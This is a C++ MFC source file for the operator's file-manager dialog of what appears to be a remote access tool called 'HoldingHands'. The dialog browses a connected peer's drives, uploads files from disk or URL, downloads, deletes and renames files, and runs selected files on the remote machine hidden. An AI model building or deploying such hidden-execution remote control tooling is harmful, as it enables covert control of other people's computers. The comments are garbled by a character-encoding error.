// FileManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "HoldingHands.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "FileManagerSrv.h"
#include "FileSelectDlg.h"
#include "UrlInputDlg.h"
#include "FileMgrInputNameDlg.h"
#include "utils.h"

//IID_IImageList
#include <commoncontrols.h>
// CFileManagerDlg �Ի���

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CFileManagerSrv*pHandler, CWnd* pParent /*=NULL*/)
	: CDialogEx(CFileManagerDlg::IDD, pParent)
	, m_Location(_T(""))
{
	m_pHandler = pHandler;
}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_FileList);
	DDX_Text(pDX, IDC_EDIT1, m_Location);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_NOTIFY(TBN_DROPDOWN, AFX_IDW_TOOLBAR, OnToolbarDropDown)
	ON_COMMAND(ID_VIEW_ICON, &CFileManagerDlg::OnViewIcon)
	ON_COMMAND(ID_VIEW_DETAILEDINFORMATION, &CFileManagerDlg::OnViewDetailedinformation)
	ON_COMMAND(ID_VIEW_LIST, &CFileManagerDlg::OnViewList)
	ON_COMMAND(ID_FM_UP,OnUp)
	ON_COMMAND(ID_FM_REFRESH,OnRefresh)
	ON_COMMAND(ID_FM_GO,OnGo)
	ON_COMMAND(ID_FM_SEARCH,OnSearch)
	ON_COMMAND(ID_FM_NEWFOLDER, OnMenuNewfolder)
	ON_COMMAND(ID_FM_DEL,OnMenuDelete)
	ON_MESSAGE(WM_FMDLG_CHDIR,OnChDir)
	ON_MESSAGE(WM_FMDLG_LIST,OnFillList)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST1, &CFileManagerDlg::OnNMDblclkList1)
	ON_NOTIFY(NM_RCLICK, IDC_LIST1, &CFileManagerDlg::OnNMRClickList1)
	ON_COMMAND(ID_UPLOAD_FROMDISK, &CFileManagerDlg::OnUploadFromdisk)
	ON_COMMAND(ID_UPLOAD_FROMURL, &CFileManagerDlg::OnUploadFromurl)
	ON_COMMAND(ID_MENU_DOWNLOAD, &CFileManagerDlg::OnMenuDownload)
	ON_MESSAGE(WM_FMDLG_PREV_DOWNLOAD,OnPrevDownload)
	ON_MESSAGE(WM_FMDLG_PREV_UPLOAD_FROMDISK, OnPrevUploadFromDisk)
	ON_MESSAGE(WM_FMDLG_PREV_UPLOAD_FROMURL, OnPrevUploadFromUrl)
	ON_MESSAGE(WM_FMDLG_PREV_NEWFOLDER,OnPrevNewfolder)
	ON_MESSAGE(WM_FMDLG_PREV_RENAME, OnPrevRename)
	ON_COMMAND(ID_RUNFILE_HIDE, &CFileManagerDlg::OnRunfileHide)
	ON_COMMAND(ID_RUNFILE_NORMAL, &CFileManagerDlg::OnRunfileNormal)
	ON_COMMAND(ID_MENU_RENAME, &CFileManagerDlg::OnMenuRename)
	ON_COMMAND(ID_MENU_NEWFOLDER, &CFileManagerDlg::OnMenuNewfolder)
	ON_COMMAND(ID_MENU_DELETE, &CFileManagerDlg::OnMenuDelete)
	ON_COMMAND(ID_MENU_COPY, &CFileManagerDlg::OnMenuCopy)
	ON_COMMAND(ID_MENU_CUT, &CFileManagerDlg::OnMenuCut)
	ON_COMMAND(ID_MENU_PASTE, &CFileManagerDlg::OnMenuPaste)
END_MESSAGE_MAP()


// CFileManagerDlg ��Ϣ�������

HIMAGELIST CFileManagerDlg::hImageList_SmallIcon = NULL;
HIMAGELIST CFileManagerDlg::hImageList_LargeIcon = NULL; 
CImageList* CFileManagerDlg::pLargeImageList = NULL;
CImageList* CFileManagerDlg::pSmallImageList = NULL;

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT | TBSTYLE_LIST,
		WS_CHILD | WS_VISIBLE | CBRS_ALIGN_TOP | CBRS_GRIPPER | CBRS_TOOLTIPS) ||
		!m_ToolBar.LoadToolBar(IDR_FM_TOOLBAR))
	{
		TRACE0("Failed to Create Dialog ToolBar\n");
		EndDialog(IDCANCEL);
	}

	m_ToolBar.ShowWindow(SW_SHOW);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0, 0, 0);

	VERIFY(m_ToolBar.SetButtonText(0, L"Up"));
	VERIFY(m_ToolBar.SetButtonText(1, L"Delete"));
	VERIFY(m_ToolBar.SetButtonText(2, L"Search"));
	VERIFY(m_ToolBar.SetButtonText(3, L"Refresh"));
	VERIFY(m_ToolBar.SetButtonText(4, L"Folder"));
	VERIFY(m_ToolBar.SetButtonText(5, L"View"));
	VERIFY(m_ToolBar.SetButtonText(6, L"Go"));
	
	//Ϊ��ͼ�������İ�ť��������˵�
	m_ToolBar.GetToolBarCtrl().SetExtendedStyle(TBSTYLE_EX_DRAWDDARROWS);
	//ȡֵTBSTYLE_EX_DRAWDDARROWS������Ϊĳһ����ť���������ť��
	DWORD dwStyle = m_ToolBar.GetButtonStyle(5);
	dwStyle |= TBSTYLE_DROPDOWN; 
	m_ToolBar.SetButtonStyle(5, dwStyle);

	HINSTANCE hInstance = GetModuleHandle(NULL);
	
	m_ImageList.Create(24, 24, ILC_COLOR32 | ILC_MASK, 0, 0);

	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_UP)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_DEL)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_SEARCH)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_REFRESH)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_NEWFOLDER)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_VIEW)));
	m_ImageList.Add(LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FM_GO)));

	m_ToolBar.GetToolBarCtrl().SetImageList(&m_ImageList);

	if (hImageList_SmallIcon == NULL){
		SHGetImageList(SHIL_SMALL, IID_IImageList, (void**)&hImageList_SmallIcon);
	}

	if (hImageList_LargeIcon == NULL){
		SHGetImageList(SHIL_LARGE, IID_IImageList, (void**)&hImageList_LargeIcon);
	}
	if (pLargeImageList == 0)
	{
		pLargeImageList = new CImageList;
		pLargeImageList->Attach(hImageList_LargeIcon);
	}
	if (pSmallImageList == 0)
	{
		pSmallImageList = new CImageList;
		pSmallImageList->Attach(hImageList_SmallIcon);
	}
	//����λ��
	Resize();
	//��ͼ���б�
	m_FileList.SetImageList(pLargeImageList, LVSIL_NORMAL);
	m_FileList.SetImageList(pSmallImageList, LVSIL_SMALL);

	m_FileList.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);

	//Set Title.
	CString Title;
	auto const peer = m_pHandler->GetPeerName();
	Title.Format(L"[%s] FileManager", CA2W(peer.first.c_str()).m_psz);
	SetWindowText(Title);

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣:  OCX ����ҳӦ���� FALSE
}


void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	if (m_ToolBar.m_hWnd == NULL)
		return;
	// TODO:  �ڴ˴������Ϣ����������
	Resize();
}

void CFileManagerDlg::Resize()
{
	RECT ClientRect;
	GetClientRect(&ClientRect);
	ClientRect.top += 67;
	m_FileList.MoveWindow(&ClientRect);

	ClientRect.top = 37;
	ClientRect.bottom = ClientRect.top + 27;
	ClientRect.left = 65;
	GetDlgItem(IDC_EDIT1)->MoveWindow(&ClientRect);

	ClientRect.top += 3;
	ClientRect.right = 65;
	ClientRect.left = 5;
	GetDlgItem(IDC_STATIC)->MoveWindow(&ClientRect);
}

void CFileManagerDlg::OnClose()
{
	// TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if (m_pHandler){
		m_pHandler->Close();
		m_pHandler = NULL;
	}
}
void CFileManagerDlg::OnToolbarDropDown(NMHDR *pnmhdr, LRESULT *plr)
{
	LPNMTOOLBAR pnmtb = reinterpret_cast<LPNMTOOLBAR>(pnmhdr);

	if (pnmtb->iItem != ID_FM_VIEW)
		return;
	CMenu menu;
	menu.LoadMenu(IDR_FM_MENU);

	CRect rect;
	m_ToolBar.GetItemRect(5,&rect);
	m_ToolBar.ClientToScreen(&rect);
	menu.GetSubMenu(1)->TrackPopupMenu(TPM_LEFTALIGN | TPM_LEFTBUTTON | TPM_VERTICAL, 
		rect.left, rect.bottom, this, &rect);
}

void CFileManagerDlg::OnViewIcon()
{
	// TODO:  �ڴ���������������
	m_FileList.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


void CFileManagerDlg::OnViewDetailedinformation()
{
	// TODO:  �ڴ���������������
	m_FileList.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}


void CFileManagerDlg::OnViewList()
{
	// TODO:  �ڴ���������������
	m_FileList.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}

void CFileManagerDlg::OnUp()
{
	//���ô���,����Ŀ¼
	GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
	m_FileList.EnableWindow(FALSE);
	//��һ��Ŀ¼.s
	m_pHandler->Up();
}
LRESULT CFileManagerDlg::OnChDir(WPARAM Statu, LPARAM CurLocation)
{
	if (!Statu)
	{
		MessageBox(L"Access Failed!");
		m_FileList.EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT1)->EnableWindow(TRUE);
	}
	//�ɹ��Ļ��ȴ��Է���Ŀ¼����,ˢ��location
	m_Location = (WCHAR*)CurLocation;
	UpdateData(FALSE);
	return 0;
}



CString GetSize(DWORD lo,DWORD hi)
{
	TCHAR strBuffer[128];
	LARGE_INTEGER liSize;
	liSize.LowPart = lo, liSize.HighPart = hi;

	GetStorageSizeString(liSize, strBuffer);
	return strBuffer;
}

void CFileManagerDlg::FillDriverList(DriverInfo*pDis, int count)
{
	m_FileList.DeleteAllItems();
	//ɾ��������
	while (m_FileList.DeleteColumn(0));
	//
	m_FileList.InsertColumn(0, L"Name", LVCFMT_LEFT, 250);
	m_FileList.InsertColumn(1, L"Type", LVCFMT_LEFT, 180);
	m_FileList.InsertColumn(2, L"FileSystem", LVCFMT_LEFT, 180);
	m_FileList.InsertColumn(3, L"Total", LVCFMT_LEFT, 180);
	m_FileList.InsertColumn(4, L"Free", LVCFMT_LEFT, 180);

	int nIconIdx = 0;
	for (int i = 0; i < count; i++)
	{
		//����ͼ������
		if (pDis[i].szName[0] == 'A' || pDis[i].szName[0] == 'B')
		{
			nIconIdx = 6;
		}
		else
		{
			switch (pDis->dwType)
			{
			case DRIVE_REMOVABLE:
				nIconIdx = 7;
				break;
			case DRIVE_FIXED:
				nIconIdx = 8;
				break;
			case DRIVE_REMOTE:
				nIconIdx = 9;
				break;
			case DRIVE_CDROM:
				nIconIdx = 11;
				break;
			default:
				nIconIdx = 8;
				break;
			}
		}
		m_FileList.InsertItem(i, &pDis[i].szName[1], nIconIdx);
		m_FileList.SetItemText(i, 1, pDis[i].szTypeName);
		m_FileList.SetItemText(i, 2, pDis[i].szFileSystem);
		m_FileList.SetItemText(i, 3, GetSize(pDis[i].Total.LowPart, pDis[i].Total.HighPart));
		m_FileList.SetItemText(i, 4, GetSize(pDis[i].Free.LowPart, pDis[i].Free.HighPart));
		//�����̷�.
		m_FileList.SetItemData(i, pDis[i].szName[0]);
	}
}
void CFileManagerDlg::FillFileList(FMFileInfo*pis)
{
	m_FileList.DeleteAllItems();
	//ɾ��������
	while (m_FileList.DeleteColumn(0));

	m_FileList.InsertColumn(0, L"Name", LVCFMT_LEFT,360);
	m_FileList.InsertColumn(1, L"Type", LVCFMT_LEFT, 160);
	m_FileList.InsertColumn(2, L"Size", LVCFMT_LEFT, 160);
	m_FileList.InsertColumn(3, L"LastWrite", LVCFMT_LEFT, 160);

	FMFileInfo End = { 0 };
	int idx = 0;
	m_FileList.SetRedraw(0);
	while (TRUE)
	{
		//����
		if (!memcmp(&End, pis, sizeof(FMFileInfo)))
			break;
		SHFILEINFO si = { 0 };
		CString Size;
		//��ӵ�list����
		SHGetFileInfo(pis->szFileName, pis->dwFileAttribute, &si, sizeof(si), SHGFI_USEFILEATTRIBUTES | SHGFI_TYPENAME | SHGFI_SYSICONINDEX);

		m_FileList.InsertItem(idx,pis->szFileName,si.iIcon);
		
		m_FileList.SetItemText(idx, 1, si.szTypeName);
		
		if (!(pis->dwFileAttribute&FILE_ATTRIBUTE_DIRECTORY))
			m_FileList.SetItemText(idx, 2, GetSize(pis->dwFileSizeLo,pis->dwFileSizeHi));
		
		FILETIME ft = { 0 };
		memcpy(&ft,&pis->dwLastWriteLo, sizeof(FILETIME));
		CTime time(ft);
		m_FileList.SetItemText(idx, 3, time.Format(L"%Y-%m-%d %H:%M"));
		//�����ļ�����.
		m_FileList.SetItemData(idx,pis->dwFileAttribute);
		
		idx++;
		pis = (FMFileInfo*)(((char*)pis) + ((char*)pis->szFileName - (char*)pis) + sizeof(WCHAR)*(wcslen(pis->szFileName) + 1));
	}
	m_FileList.SetRedraw(1);
}

LRESULT CFileManagerDlg::OnFillList(WPARAM wParam, LPARAM lParam)
{
	char*pBuff = (char*)lParam;
	DWORD dwRead = wParam;

	if (m_Location.GetLength())
		FillFileList((FMFileInfo*)pBuff);
	else
		FillDriverList((DriverInfo*)pBuff,dwRead/sizeof(DriverInfo));
	//���ô���.
	m_FileList.EnableWindow(TRUE);
	GetDlgItem(IDC_EDIT1)->EnableWindow(TRUE);
	return 0;
}

void CFileManagerDlg::OnNMDblclkList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	*pResult = 0;
	//û��ѡ����ֱ�ӷ���.

	if (m_FileList.GetSelectedCount() == 0)
		return;
	//��������ļ���������.
	if (m_Location.GetLength() && !(m_FileList.GetItemData(pNMItemActivate->iItem) & FILE_ATTRIBUTE_DIRECTORY))
		return;

	//���ô���,����Ŀ¼
	GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
	m_FileList.EnableWindow(FALSE);

	if (m_Location.GetLength())
	{
		CString NewDir = m_Location;
		NewDir += "\\";
		NewDir += m_FileList.GetItemText(pNMItemActivate->iItem, 0);
		m_pHandler->ChDir(NewDir.GetBuffer());
	}
	else
	{
		//������.
		WCHAR szRoot[4] = { 0 };
		szRoot[0] = m_FileList.GetItemData(pNMItemActivate->iItem);
		szRoot[1] = ':';
		szRoot[2] = '\\';
		m_pHandler->ChDir(szRoot);
	}
}


void CFileManagerDlg::OnNMRClickList1(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	*pResult = 0;
	CMenu menu;
	menu.LoadMenuW(IDR_FM_MENU);
	POINT pt;
	GetCursorPos(&pt);
	//FileList �Ҽ��˵�
	menu.GetSubMenu(0)->TrackPopupMenu(TPM_LEFTALIGN | TPM_LEFTBUTTON | TPM_VERTICAL,
		pt.x,pt.y, this);
}

/*
	�κ�ģ̬�Ի���Ĵ���Ӧ������IO��Ϣ����ʱ����,��Ϊ��ʱ�򴰿ڶ��󲻻ᱻdelete��.
	��Ҫ�ڴ��ڵ���¼����洴��ģ̬�Ի���.
*/
void CFileManagerDlg::OnUploadFromdisk(){
	m_pHandler->PrevUploadFromDisk();
}
void CFileManagerDlg::OnUploadFromurl(){
	m_pHandler->PrevUploadFromUrl();
}

void CFileManagerDlg::OnMenuDownload(){
	m_pHandler->PrevDownload();
}

void CFileManagerDlg::OnMenuRename(){
	m_pHandler->PrevRename();
}

void CFileManagerDlg::OnMenuNewfolder(){
	m_pHandler->PrevNewFolder();
}

//
LRESULT CFileManagerDlg::OnPrevUploadFromUrl(WPARAM wParam, LPARAM lParam)
{
	// TODO:  �ڴ���������������
	if (!m_Location.GetLength())
		return 0;
	//�����ʱ���ڶ���delete �������.
	//DestroyWindow��ص����ڼ������е��Ӵ���.
	//���൱���ǵ���DestroyWindow�ر���DoModal�Ĵ���.
	CUrlInputDlg dlg(this);
	if (IDOK != dlg.DoModal() || dlg.m_Url.GetLength() == 0)
	{
		return 0;
	}
	//�Է�����MINIDownloadģ��.
	m_pHandler->UploadFromUrl(dlg.m_Url.GetBuffer());
	return 0;
}
LRESULT CFileManagerDlg::OnPrevUploadFromDisk(WPARAM wParam, LPARAM lParam)
{
	if (!m_Location.GetLength())
		return 0;

	CFileSelectDlg dlg(this);
	if (IDOK != dlg.DoModal() || dlg.m_FileList.GetLength() == 0)
	{
		return 0;
	}
	//�Է�����MINIFileTransģ��.
	m_pHandler->UploadFromDisk(dlg.m_FileList.GetBuffer());
	return 0;
}

LRESULT CFileManagerDlg::OnPrevDownload(WPARAM wParam, LPARAM lParam)
{
	if (!m_Location.GetLength() || m_FileList.GetSelectedCount() == 0)
		return 0;
	//
	TCHAR szPathName[MAX_PATH] = { 0 };
	BROWSEINFO bInfo = { 0 };
	bInfo.hwndOwner = m_hWnd; // ������;
	bInfo.lpszTitle = L"Please Select Save Path";
	bInfo.ulFlags = BIF_RETURNONLYFSDIRS | BIF_USENEWUI | BIF_UAHINT;
	LPITEMIDLIST lpDlist;
	lpDlist = SHBrowseForFolder(&bInfo);
	if (NULL == lpDlist) // ������ȷ����ť;
	{
		return 0;
	}
	SHGetPathFromIDList(lpDlist, szPathName);
	CString s;
	s = szPathName;		//����·��
	s += L"\n";
	s += m_Location;	//Դ·��
	s += "\n";

	POSITION pos = m_FileList.GetFirstSelectedItemPosition();
	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		s += m_FileList.GetItemText(idx, 0);
		s += L"\n";
	}
	m_pHandler->Download(s.GetBuffer());
	return 0;
}

void CFileManagerDlg::OnRunfileHide()
{
	if (m_FileList.GetSelectedCount() == 0)
		return;
	CString Files;
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();

	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		Files += m_FileList.GetItemText(idx, 0);
		Files += L"\n";
	}
	m_pHandler->RunFileHide(Files.GetBuffer());
}


void CFileManagerDlg::OnRunfileNormal()
{
	if (m_FileList.GetSelectedCount() == 0)
		return;
	CString Files;
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();

	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		Files += m_FileList.GetItemText(idx, 0);
		Files += L"\n";
	}
	m_pHandler->RunFileNormal(Files.GetBuffer());
}


void CFileManagerDlg::OnGo()
{
	UpdateData();
	//���ô���,����Ŀ¼
	GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
	m_FileList.EnableWindow(FALSE);
	//�޸�Ŀ¼����
	m_pHandler->ChDir(m_Location.GetBuffer());
}

void CFileManagerDlg::OnRefresh()
{
	//���ô���,����Ŀ¼
	GetDlgItem(IDC_EDIT1)->EnableWindow(FALSE);
	m_FileList.EnableWindow(FALSE);
	//�޸�Ŀ¼����
	m_pHandler->Refresh();
}

LRESULT	CFileManagerDlg::OnPrevNewfolder(WPARAM wParam, LPARAM lParam)
{
	CFileMgrInputNameDlg dlg(L"New Folder",this);
	if (dlg.DoModal() != IDOK || dlg.m_FileName.GetLength() == 0)
		return 0;
	m_pHandler->NewFolder(dlg.m_FileName.GetBuffer());
	//ˢ��һ��
	OnRefresh();
	return 0;
}
LRESULT	CFileManagerDlg::OnPrevRename(WPARAM wParam, LPARAM lParam)
{
	if (m_FileList.GetSelectedCount() == 0)
		return 0;
	//ֻ������һ��.
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();

	if (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		CFileMgrInputNameDlg dlg(m_FileList.GetItemText(idx, 0),this);
		if (dlg.DoModal() != IDOK || dlg.m_FileName.GetLength() == 0)
			return 0;
		CString s;
		s += m_FileList.GetItemText(idx, 0);
		s += L"\n";
		s += dlg.m_FileName;
		m_pHandler->Rename(s.GetBuffer());
		//ˢ��һ��
		OnRefresh();
	}
	return 0;
}



void CFileManagerDlg::OnOK()
{
	//���λس���.
	OnGo();
}


void CFileManagerDlg::OnMenuDelete()
{
	if (m_FileList.GetSelectedCount() == 0)
		return;

	CString s;
	POSITION pos = m_FileList.GetFirstSelectedItemPosition();

	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		s += m_FileList.GetItemText(idx, 0);
		s += L"\n";
	}
	m_pHandler->Delete(s.GetBuffer());
	//ˢ��һ��
	OnRefresh();
}


void CFileManagerDlg::OnMenuCopy()
{
	//������Ŀ¼�������ƺ�cut
	if (m_FileList.GetSelectedCount() == 0 || m_Location.GetLength() == 0)
		return;
	CString s = m_Location + L"\n";

	POSITION pos = m_FileList.GetFirstSelectedItemPosition();
	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		s += m_FileList.GetItemText(idx, 0);
		s += "\n";
	}
	m_pHandler->Copy(s.GetBuffer());
}


void CFileManagerDlg::OnMenuCut()
{
	//������Ŀ¼�������ƺ�cut
	if (m_FileList.GetSelectedCount() == 0 || m_Location.GetLength() == 0)
		return;

	CString s = m_Location + L"\n";

	POSITION pos = m_FileList.GetFirstSelectedItemPosition();
	while (pos)
	{
		int idx = m_FileList.GetNextSelectedItem(pos);
		s += m_FileList.GetItemText(idx, 0);
		s += "\n";
	}
	m_pHandler->Cut(s.GetBuffer());
}


void CFileManagerDlg::OnMenuPaste()
{
	// TODO:  �ڴ���������������
	if (m_Location.GetLength() == 0)
		return;
	m_pHandler->Paste();
	OnRefresh();
}


void CFileManagerDlg::OnSearch()
{
	m_pHandler->Search();
}